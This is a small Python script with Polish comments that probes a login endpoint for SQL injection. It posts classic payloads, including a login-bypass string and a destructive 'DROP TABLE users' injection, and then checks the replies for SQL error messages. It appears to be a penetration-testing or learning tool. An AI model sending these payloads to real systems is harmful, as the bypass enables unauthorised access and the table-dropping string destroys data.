"""
Nazwa:
- SQL_Injection.py

Opis:
- Skrypt testuje prostą podatność SQL Injection wysyłając różne klasyczne payloady do endpointa POST.
Jeśli w odpowiedzi pojawią się typowe błędy SQL, może to sugerować podatność.

Wymagania:
- requests: `pip install requests`

Autor: 
- Mateusz
"""
import requests
# Adres testowanego endpointa
url = "http://192.168.1.197:8080"
# Lista klasycznych payloadów SQLi
payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE users; --"]
vulnerable = False
# Testowanie każdego payloadu
for payload in payloads:
    params = {"username": payload, "password": "test"}
    response = requests.post(url, data=params)
# Sprawdzenie, czy odpowiedź zawiera typowe komunikaty błędów SQL
    if any(x in response.text.lower() for x in ["sql", "syntax", "error", "mysql", "warning"]):
        print(f"[!] Potencjalna podatność SQLi z payloadem: {payload}")
        vulnerable = True
if not vulnerable:
    print("[-] Nie wykryto podatności SQL Injection.")
